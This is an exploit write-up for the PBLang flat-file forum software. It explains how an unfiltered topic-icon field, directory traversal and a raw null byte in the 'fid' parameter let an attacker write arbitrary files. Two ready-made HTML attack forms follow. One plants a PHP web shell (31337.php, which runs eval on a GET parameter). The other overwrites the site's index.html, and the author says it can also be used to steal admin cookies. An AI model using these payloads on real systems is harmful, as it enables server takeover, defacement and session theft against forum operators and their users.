PBLang <= 4.99.17.q Remote File Rewriting / Command Execution
=============================================================



---------------------------------------------------------------
 ____            __________         __             ____  __   
/_   | ____     |__\_____  \  _____/  |_          /_   |/  |_ 
 |   |/    \    |  | _(__  <_/ ___\   __\  ______  |   \   __\
 |   |   |  \   |  |/       \  \___|  |   /_____/  |   ||  |  
 |___|___|  /\__|  /______  /\___  >__|            |___||__|  
          \/\______|      \/     \/                         

---------------------------------------------------------------

PBLang <= 4.99.17.q Remote File Rewriting / Remote Command Execution

---------------------------------------------------------------

#By KiNgOfThEwOrLd				

---------------------------------------------------------------
PoC:

PBLang is a flat forum, it doesn&#039;t need any database. When we write a new 
topic, all the topics informations will be saved in a file located in 
"\db\posts" (a not readeable directory). It looks like a php file, in fact the 
informations will be saved in this way:

<?php

$psubject="[subject]";
$pcontent="[contenet]";
$pauthor="[author]";
$pdate="[date]";
$plastdate="";
$pimage="[icon]";
$plastreply="0";
$plastauthor="";
$pviews="0";
$pnotify="";
$plock="";
$pip="";
$pvisitors="";
$psticky="";
$plockview="";

?>

The "subject" and the "contenent" values is "htmlentitiesed", so we can&#039;t type 
a malicious code there...but the "image" value is not filtred, so we can 
execute a malicious code!
Don&#039;t worry if the directory is not readable, using the directory traversl 
variable we can make a file where we want, and so we can read that! The file 
name will be the "fid" value that we send via POST, and the file wont have any 
estension, it will be like: fid_1 (or something like that). Then, editing the 
cid value like: "evilfile.php\0", we can make a malicious file.

Ps. u gotta use nullbyte not encoded, like: \0
if u try to use %00 it will be not considered like nullbyte  ;) 

---------------------------------------------------------------
Remote Command Execution Exploit (Works only whit Magic Quotes OFF):

<!-- This code will make "31337.php" in http://[target]/[pblang_path], u can 
execute a malicious code via GET as 31337.php?php=[YOUR_CODE] -->
<form action=&#039;[target]/ntopic.php?idnum=[idtopic]&#039; name=&#039;postmodify&#039; 
enctype=&#039;multipart/form-data&#039; method=&#039;POST&#039;  onSubmit=&#039;submitonce
(this);&#039;target=&#039;_self&#039;>
<input type=&#039;text&#039; name=&#039;subject&#039; value=&#039;Owned by KiNgOfThEwOrLd&#039;s Exploit&#039;>
<input type=&#039;hidden&#039; name=&#039;fid&#039; value=&#039;../../../../31337.php\0&#039;>
<input type=&#039;hidden&#039; name=&#039;cat&#039; value=&#039;2&#039; size=40>
<input type=&#039;radio&#039; name=&#039;topicicon&#039; value=&#039;"; <?php eval(stripslashes($_GET
[php])); ?>&#039; CHECKED>
<textarea name=&#039;message&#039; rows=&#039;12&#039; cols=&#039;60&#039; onselect=&#039;storeCaret(this)&#039; 
onclick=&#039;storeCaret(this)&#039; onkeyup=&#039;storeCaret(this)&#039;>VISIT Http://www.inj3ct-
it.org</textarea>
<input type=&#039;hidden&#039; name=&#039;gueststatus&#039; value=&#039;&#039;>
<input type=&#039;checkbox&#039; name=&#039;EMNotify&#039;>
<input type=&#039;submit&#039; name=&#039;Submit&#039; value=&#039;Own!&#039;>
</form>
---------------------------------------------------------------
Index Rewriting Exploit

<!-- This code will rewrite or make "index.html" in http://[target]/
[pblang_path] -->
<form action=&#039;[target]/ntopic.php?idnum=[idtopic]&#039; name=&#039;postmodify&#039; 
enctype=&#039;multipart/form-data&#039; method=&#039;POST&#039;  onSubmit=&#039;submitonce
(this);&#039;target=&#039;_self&#039;>
<input type=&#039;text&#039; name=&#039;subject&#039; value=&#039;Owned by KiNgOfThEwOrLd&#039;s Exploit&#039;>
<input type=&#039;hidden&#039; name=&#039;fid&#039; value=&#039;../../../../index.html\0&#039;>
<input type=&#039;hidden&#039; name=&#039;cat&#039; value=&#039;2&#039; size=40>
<input type=&#039;radio&#039; name=&#039;topicicon&#039; value=&#039;"; [YOUR HTML CODE]&#039; CHECKED>
<textarea name=&#039;message&#039; rows=&#039;12&#039; cols=&#039;60&#039; onselect=&#039;storeCaret(this)&#039; 
onclick=&#039;storeCaret(this)&#039; onkeyup=&#039;storeCaret(this)&#039;>VISIT Http://www.inj3ct-
it.org</textarea>
<input type=&#039;hidden&#039; name=&#039;gueststatus&#039; value=&#039;&#039;>
<input type=&#039;checkbox&#039; name=&#039;EMNotify&#039;>
<input type=&#039;submit&#039; name=&#039;Submit&#039; value=&#039;Own!&#039;>
</form>
<!-- You can also use this one to steal the admin&#039;s cookies, or execute some 
arbitrary operations  ;)  -->
---------------------------------------------------------------



